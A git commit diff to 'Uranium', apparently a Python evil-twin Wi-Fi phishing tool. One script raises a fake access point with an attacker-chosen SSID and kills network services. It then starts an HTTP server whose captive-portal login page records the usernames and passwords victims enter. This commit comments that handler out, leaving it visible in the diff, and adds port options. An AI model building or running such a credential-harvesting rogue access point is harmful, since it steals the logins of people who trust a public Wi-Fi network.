4f0f908b8043f83f3392685647eb4fce25e9e205
cr4sh <111238843+cr4sh-me@users.noreply.github.com>
2022-08-15 13:09:21 +0200

    Add files via upload

--- server.py
+++ server.py
@@ -3,86 +3,126 @@ import cgi
 import os
 from modules.banner import bstring
 import argparse
-from datetime import date
+import datetime
 
-parser = argparse.ArgumentParser()
-parser.add_argument(
+parser = argparse.ArgumentParser(description='Uranium http server options help')
+parser._action_groups.pop()
+requiredNamed = parser.add_argument_group('required') ### REQUIRED ARGS ###
+requiredNamed.add_argument(
         "-t",
         "--template",
         type=str,
         required=True,
         help=("Template " +
             "Example: -t [template_name]"))
+requiredNamed.add_argument(
+        "-p",
+        "--port",
+        type=str,
+        required=True,
+        help=("Choose port for python http server. " +
+            "All processes on that port will be killed! " + 
+            "Example: -p 80"))
+optionalNamed = parser.add_argument_group('optional') ### OPTIONAL ARGS ###
+optionalNamed.add_argument(
+        "-l",
+        "--local",
+        action='store_true',
+        required=False,
+        help=("Local mode. " +
+            "Uses localhost as default hostname " + 
+            "Use if you are making captive portal templates " +
+            "Example: -l"))
 
 args = parser.parse_args()
 
+PORT = args.port
 template = args.template
-HOST_NAME = '127.0.0.1'
-# HOST_NAME = '10.0.0.1'
-PORT = 80
 
-class Server(BaseHTTPRequestHandler):
+if args.local is True:
+    HOST_NAME = '127.0.0.1'
+    print(bstring.INFO, 'Using local hostname for testing:', HOST_NAME) 
+else:
+    HOST_NAME = '10.0.0.1'
+    print(bstring.INFO, 'Using default hostname for captive portal:', HOST_NAME)
 
-    def do_GET(self):
+
+# class Server(BaseHTTPRequestHandler):
+#     # html_login = """
+#     # <html>
+#     # <body>
+#     # <script>
+#     #     window.onload = function () {
+#     #         window.location.href = "index.html";
+#     #     }
+#     # </script>
+#     # </body>
+#     # </html>
+#     # """
+
+#     # html_redirect = """
+#     # <html>
+#     # <body>
+#     # <script>
+#     #     window.onload = function () {
+#     #         window.location.href = "login.html";
+#     #     }
+#     # </script>
+#     # </body>
+#     # </html>
+#     # """
+
+#     def do_GET(self):
         
-        if self.path == "/":
-            self.path = '/templates/%s/index.html' % (template)
-        else:
-            self.path = '/templates/%s/redirect.html' % (template)
+#         if self.path == "/":
+#             self.path = '/templates/%s/index.html' % (template)
 
-        f = open(self.path[1:]).read()
-        self.send_response(200)
-        self.send_header("Content-type", "text/html")
-        self.end_headers()
-        self.wfile.write(bytes(f, 'utf-8'))
+#         f = open(self.path[1:]).read()
+#         self.send_response(200)
+#         self.send_header("Content-type", "text/html")
+#         self.end_headers()
+#         self.wfile.write(bytes(f, 'utf-8'))
+
         
-
-        path = self.path
-        # if self.path == '/':
-        #     self.path = '/templates/%s/index.html' % (template)
-        # try:
-        #     split_path = os.path.splitext(self.path)
-        #     request_extension = split_path[1]
-        #     if request_extension != ".py":
-        #         f = open(self.path[1:]).read()
-        #         self.send_response(200)
-        #         self.end_headers()
-        #         self.wfile.write(bytes(f, 'utf-8'))
-        #     else:
-        #         f = "File not found"
-        #         self.send_error(404,f)
-        # except:
-        #     f = "File not found"
-        #     self.send_error(404,f)
-        # path = self.path
+#         # path = self.path
         
-    def do_POST(self):
-        self.send_response(200)
-        self.send_header("Content-type", "text/html")
-        self.end_headers()
-        form = cgi.FieldStorage(
-            fp=self.rfile, 
-            headers=self.headers,
-            environ={'REQUEST_METHOD':'POST',
-                     'CONTENT_TYPE':self.headers['Content-Type'],
-                     })
-        username = form.getvalue("username")
-        password = form.getvalue("password")
-        print("\n" + bstring.CREDS, "Captured credinentials!")
-        print("""
-----------------------------
-Username: """ + username + """
-Password: """ + password + """
-----------------------------
-""")
+#     def do_POST(self):
+#         self.send_response(200)
+#         self.send_header("Content-type", "text/html")
+#         self.end_headers()
+#         form = cgi.FieldStorage(
+#             fp=self.rfile, 
+#             headers=self.headers,
+#             environ={'REQUEST_METHOD':'POST',
+#                      'CONTENT_TYPE':self.headers['Content-Type'],
+#                      })
+#         current_date = str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")) 
+#         username = form.getvalue("username")
+#         password = form.getvalue("password")
+#         print("\n" + bstring.CREDS, "Captured user input!")
 
-if __name__ == "__main__":
-    httpd = HTTPServer((HOST_NAME,PORT),Server)
-    print("\n" + bstring.INFO, "Server started http://%s:%s" % (HOST_NAME,PORT))
-    try:
-        httpd.serve_forever()
-    except KeyboardInterrupt:
-        pass
+#         print("""
+# ----------------------------
+# Date: """ + bstring.BLUE + current_date + bstring.RESET + """
+# Username: """ + bstring.GREEN + username + bstring.RESET + """
+# Password: """ + bstring.GREEN + password + bstring.RESET + """
+# ----------------------------   
+# """)    
+#         file = open("captured.txt", "a")
+#         file.write("""
+# Date: """ + current_date + """
+# Username: """ + username + """
+# Password: """ + password + """
+# ----------------------------""")
+#         file.close
 
-    httpd.server_close()
-    print("\n" + bstring.INFO, "Server stopped")
+# if __name__ == "__main__":
+#     httpd = HTTPServer((HOST_NAME,PORT),Server)
+#     print("\n" + bstring.INFO, "Server started http://%s:%s" % (HOST_NAME,PORT))
+#     try:
+#         httpd.serve_forever()
+#     except KeyboardInterrupt:
+#         pass
+
+#     httpd.server_close()
+#     print("\n" + bstring.INFO, "Server stopped")
--- uranium.py
+++ uranium.py
@@ -11,8 +11,10 @@ from modules.banner import print_banner
 os.system('clear')
 print_banner()
 
-parser = argparse.ArgumentParser()
-parser.add_argument(
+parser = argparse.ArgumentParser(description='Uranium options help')
+parser._action_groups.pop()
+requiredNamed = parser.add_argument_group('required') ### REQUIRED ARGS ###
+requiredNamed.add_argument(
         "-i",
         "--interface",
         type=str,
@@ -20,14 +22,14 @@ parser.add_argument(
         help=("Choose an interface that supports managed and monitor " +
             "modes for creating fake AP. " +
             "Example: -i wlan1"))
-parser.add_argument(
+requiredNamed.add_argument(
         "-s",
         "--ssid",
         type=str,
         required=True,
         help=("Choose SSID for fake AP. " +
             "Example: -s Uranium-AP"))
-parser.add_argument(
+requiredNamed.add_argument(
         "-t",
         "--template",
         type=str,
@@ -35,6 +37,15 @@ parser.add_argument(
         help=("Choose template to use as captive portal login page. " +
             "Example: -t captive_login. " +
             "Avaiable templates: %s" % (os.listdir('templates'))))
+optionalNamed = parser.add_argument_group('optional') ### OPTIONAL ARGS ###
+optionalNamed.add_argument(
+        "-p",
+        "--port",
+        type=str,
+        required=False,
+        help=("Choose custom port (80 by default) for python http server. " +
+            "All processes on that port will be killed! " + 
+            "Example: -p 80"))
 
 args = parser.parse_args()
 
@@ -45,6 +56,14 @@ template = args.template
 print(bstring.INFO, 'Using interface:', iface)
 print(bstring.INFO, 'Using SSID:', ssid)
 print(bstring.INFO, 'Using template:', template)
+
+if args.port is not None:
+    server_port = args.port
+    print(bstring.INFO, 'Using custom port:', server_port) 
+else:
+    server_port = 80
+    print(bstring.INFO, 'Using default port:', server_port)
+
 
 
 
@@ -66,8 +85,8 @@ killall hostapd > /dev/null 2>&1
 pkill wpa_supplicant > /dev/null 2>&1
 nmcli radio wifi off > /dev/null 2>&1
 rfkill unblock wlan > /dev/null 2>&1
-kill $(lsof -t -i:80) > /dev/null 2>&1
-''')
+kill $(lsof -t -i:%s) > /dev/null 2>&1
+''') % (server_port)
 
 
 print("\n" + bstring.ACTION, "Starting access point...")
@@ -88,11 +107,11 @@ os.system('ifconfig ' + iface + ' 10.0.0.1 netmask 255.255.255.0')
 print("\n" + bstring.ACTION, "Enabling http server...")
 print("\n" + bstring.ACTION, "Waiting for client interaction...")
 
-os.system('python3 server.py -t %s' % (template))
+os.system('python3 server.py -t %s -p %s' % (template, server_port))
 
-print("\n" + bstring.ACTION, "Enabling services back in 5s...")
+print("\n" + bstring.ACTION, "Enabling services back in 3s...")
 
-time.sleep(5)
+time.sleep(3)
 
 os.system('''
 systemctl start NetworkManager > /dev/null 2>&1
